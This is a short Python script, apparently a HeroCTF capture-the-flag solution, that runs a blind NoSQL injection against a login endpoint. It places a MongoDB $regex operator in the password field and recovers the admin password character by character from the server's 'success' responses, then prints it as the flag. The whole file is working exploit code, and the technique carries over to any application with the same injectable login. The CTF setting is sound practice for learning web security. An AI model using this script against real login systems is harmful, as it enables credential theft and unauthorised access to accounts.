import requests

passwd = ""
headers = {'Content-Type': 'application/json'}

for j in range(32):
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    for i in range(len(alphabet)):
        c = alphabet[i]
        data = '{"username": {"$eq": "admin"}, "password": {"$regex": "^'+passwd+c+'" }}'
        response = requests.post(
            'http://challs.heroctf.fr:3000/login', headers=headers, data=data, verify=True)
        if b'success' in response.content:
            print('Nouveau caractère trouvé : ', c)
            passwd += c
print("Flag : Hero{",passwd,"}")
